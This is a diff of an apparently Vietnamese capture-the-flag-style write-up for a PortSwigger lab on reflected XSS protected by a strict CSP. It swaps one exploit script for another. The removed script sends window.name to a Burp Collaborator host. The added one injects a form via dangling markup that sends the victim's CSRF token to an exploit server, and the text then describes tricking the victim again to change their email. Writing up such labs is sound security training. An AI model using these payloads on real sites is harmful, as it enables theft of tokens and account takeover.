@@ -35,22 +35,22 @@ Lý do k đóng " là bởi khi không đóng. Trình duyệt sẽ hiểu rằng
 
 ![image](https://github.com/vanniichan/Portswigger/assets/112863484/2a9056c8-15b3-4c81-ab1f-785a64d38042)
 
-Từ trên ta có payload sau: Nếu chưa có thông tin gì (window.name) thì ta sẽ dùng `else` mục đích giải thích ở trên. Sau đó khi đã có thông tin nó sẽ gửi về request của `Burp collabor`
+Từ trên ta có payload sau: Nếu chưa có thông tin gì (window.name) thì ta sẽ dùng `else` mục đích giải thích ở trên. Sau đó khi đã có thông tin nó sẽ gửi về request của `Burp collabor`. Vì browser của victim chạy bằng Chrome nên khôg thể dùng payload của solution. Tôi tìm được 1 payload khác ở [bài này](https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/)
 
 ```
 <script>
-if(window.name) {
-		new Image().src='//wqqef7ejd38jegvd09sykz0ujlpcd21r.oastify.com?'+encodeURIComponent(window.name);
-		} else {
-     			location = 'https://0ae2000b04d9e4b480f02bf300bb00dd.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a4800bf0403e41f80932a5001200097.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
-}
+location='https://0ac900f803f0a62583a5a634009b002e.web-security-academy.net/my-account?email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0ac8002403eba6ea8339a50d01ea00a2.exploit-server.net/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E';
 </script>
 ```
 
-Sau khi lấy được csrf từ victim ta tiến hành thay đổi email. Tuy nhiên respond sẽ báo rằng invalid csrf token lý do là thực ra mình còn thiếu session của victim
+![image](https://github.com/vanniichan/Portswigger/assets/112863484/5e964adb-28f6-469b-8dec-743b48a19691)
 
+Sau khi lấy được csrf từ victim ta tiến hành thay đổi email. Tuy nhiên respond sẽ báo rằng invalid csrf token lý do là thực ra mình còn thiếu session của victim. Ta phải lừa victim 1 lần nữa :))
 
+![image](https://github.com/vanniichan/Portswigger/assets/112863484/1e0a1f95-0c5e-4da2-b57a-c99a8d5a185f)
 
+Gửi [Payload](https://github.com/vanniichan/Portswigger/blob/main/Cross-site%20scripting/Lab_29/Lab-29_payload.js) vào server và exploit và thành công
 
 # Flag: 
 
+![image](https://github.com/vanniichan/Portswigger/assets/112863484/d50aed6a-8ff4-4748-90f9-6fdf1826a44f)
